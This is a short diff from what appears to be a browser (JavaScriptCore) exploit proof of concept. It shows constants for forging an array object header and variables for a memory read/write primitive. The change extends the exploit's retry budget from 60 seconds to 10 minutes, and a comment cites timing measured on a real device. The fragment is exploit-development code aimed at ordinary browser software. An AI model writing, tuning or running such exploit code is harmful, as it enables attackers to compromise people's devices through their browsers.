@@ -21,7 +21,11 @@
   var OFF = 0x0002000000000000n;
   var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);   // ArrayWithDouble | ArrayType | White
 
-  var BUDGET = 60000, t0 = Date.now(), rounds = 0;
+  // The PoC's own acquireRW() loops 15000 times.  Our first complete run only
+  // got 647 rounds in a 60 s budget (93 ms/round -- verified on device), so the
+  // budget is what decides whether the reclaim ever gets its chance, not the
+  // mechanism.  10 minutes = ~6400 honest attempts.
+  var BUDGET = 600000, t0 = Date.now(), rounds = 0;
   var arr, arr_index, W = null, HA, SA, gap, changeArr, holder, scribble;
 
   function foo(flag, k, allocCount) {
